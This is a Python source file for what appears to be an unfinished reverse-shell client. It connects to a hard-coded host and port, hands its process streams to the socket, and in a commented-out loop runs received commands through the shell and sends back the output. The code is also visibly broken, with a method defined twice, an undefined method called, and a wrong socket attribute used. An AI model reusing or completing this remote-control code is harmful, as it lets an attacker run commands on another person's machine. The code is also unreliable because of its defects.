import socket
import subprocess
import json

BUFFER_SIZE = 1024
MESSAGE = 'echo Hola, mundo!'


class Session():
    def __init__(self, ip, port, buffer_size=2048):
        self.port = port
        self.ip = ip
        self.bufs = buffer_size
        self.address = (self.ip, self.port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = True

    def parsecmd(self):
        self.cmd = (b''.join(self.chunks)).decode('utf-8')
        print(self.cmd)
        INTERNAL = ["exit", "}whoami", "}sessionid"]
        if self.cmd in INTERNAL:
            return True
        return False

    def exec_internal_cmd(self):
        print("InternalCMD")
        if self.cmd == "exit":
            output = subprocess.CompletedProcess()
            output.returncode = 0
            output.stderr = None
            output.stdout = "Bye"
            return output
            self.socket.close()
        elif self.cmd == "whoami":
            output = subprocess.CompletedProcess()
            output.returncode = 0
            output.stderr = None
            output.stdout = "\033[31m;t4LoN }>->\033[31m;"
            return output

    def exec_internal_cmd(self):
        print("comando: ", self.cmd)
        output = subprocess.run(self.cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                shell=True)
        print("salida: ", output)
        return output

    def recvcmd(self):
        self.chunks = []
        while True:
            self.bytes = self.socket.recv(self.bufs)
            print("checkpoint")
            self.chunks.append(self.bytes)
            print(self.bytes)


    def reverse_shell(self):
        self.stdout = self.sock.makefile(mode='wb')
        self.stderr = self.sock.makefile(mode='wb')
        self.stdin  = self.sock.makefile(mode='rb')
        subprocess.run(stderr=self.stderr, stdin=self.stdin, stdout=self.stdout)

    def connect(self): 
        try:
            self.socket.connect(self.address)
            print("connected")
            self.reverse_shell()
            # self.socket.setblocking(0)
            # while True:
            #     self.chunks = []
            #     try:
            #         self.recvcmd()
            #         INTERNAL = self.parsecmd()
            #         if INTERNAL:
            #             output = self.exec_internal_cmd()
            #         else:
            #             output = self.exec_cmd()
            #         self.socket.sendall(output.output.encode('utf-8'))

            #     except (BlockingIOError):
            #         if self.chunks:
            #             print(self.chunks)
            #         else:
            #             pass

        except (TimeoutError):
            raise TimeoutError

session = Session("192.168.4.1", 4242)
session.connect()
